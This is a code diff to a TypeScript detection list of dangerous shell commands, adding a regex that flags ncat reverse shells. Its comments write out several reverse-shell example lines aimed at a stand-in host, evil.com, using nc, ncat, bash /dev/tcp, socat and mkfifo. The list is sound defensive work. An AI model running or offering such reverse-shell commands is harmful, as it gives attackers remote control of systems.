@@ -421,11 +421,14 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /(?:^|[;&|]\s*)snap\s+refresh\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // Reverse shell vectors — no download step; these directly open an outbound shell session:
   // nc -e /bin/bash evil.com 4444  — netcat with -e flag spawns a shell on connect
+  // ncat -e /bin/bash evil.com 4444 — Nmap's ncat has identical -e/--exec semantics to nc and
+  //   is commonly pre-installed in CI/Linux environments; treated as a symmetric peer to nc.
   // bash -i >& /dev/tcp/evil.com/4444 0>&1  — bash built-in TCP redirect (no external tool needed)
   // socat EXEC:bash tcp:evil.com:4444  — socat EXEC: mode spawns a process on the remote side
   // False-positive analysis: `nc -z host port` (port scan, no -e) and `nc -l 8080` (listener,
   // no shell exec) do not match because neither has -e followed by a shell name.
   { pattern: /\bnc\b.*-e\b.*\b(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash)\b/, category: "reverse-shell" },
+  { pattern: /\bncat\b.*-e\b.*\b(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash)\b/, category: "reverse-shell" },
   { pattern: /\/dev\/tcp\//, category: "reverse-shell" },
   { pattern: /\bsocat\b.*\bEXEC:/, category: "reverse-shell" },
   // Reverse shell via mkfifo — `mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1`
